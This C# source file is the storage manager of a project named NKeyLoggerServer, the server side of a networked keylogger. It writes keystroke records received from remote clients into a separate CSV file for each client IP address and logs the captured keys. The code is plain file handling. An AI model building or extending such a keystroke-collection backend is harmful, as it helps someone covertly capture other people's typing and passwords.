using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;
using System.Collections.Concurrent;

namespace NKeyLoggerServer;
internal class StorageManager
{
    private readonly ConcurrentDictionary<Network, CSVFile> CSVFiles = new ConcurrentDictionary<Network, CSVFile>();
    private AbstractSetting setting { get; init; }
    private const string storageDirName = "storage";
    private readonly DirectoryInfo storageDir;
    public StorageManager(AbstractSetting setting)
    {
        this.setting = setting;
        if (!Directory.Exists(storageDirName))
            Directory.CreateDirectory(storageDirName);
        storageDir = new DirectoryInfo(storageDirName);
        this.setting.onChangeFile += (AbstractSetting s) =>
        {
            CSVFiles.Values.ToList().ForEach(c => c.MaxFileLen = long.Parse(setting.Properties["maxfilesize"]));
        };
    }

    public void saveToFile(Server sender, Network client, AbstractKeyInfo keyInfo)
    {
        try
        {
            if (!CSVFiles.ContainsKey(client))
                CSVFiles[client] = new CSVFile(storageDir.FullName + "/" + client.getAddress() + ".csv");
            CSVFiles[client].MaxFileLen = long.Parse(setting.Properties["maxfilesize"]);
            CSVFiles[client].append(keyInfo);
            Log<StorageManager>.Instance.logger?.LogDebug(keyInfo.getValues().First() + " " + keyInfo.getValues().ElementAt(3));
        } catch (ObjectDisposedException e)
        {
            Log<StorageManager>.Instance.logger?.LogError($"File object disposed\n {e.StackTrace}");
        }
    }

    public void removeClient(Network client)
    {
        CSVFile? val = null;
        if (CSVFiles.TryGetValue(client, out val))
        {
            CSVFiles[client].Dispose();
        }
        CSVFiles.Remove(client,out _);
    }

}
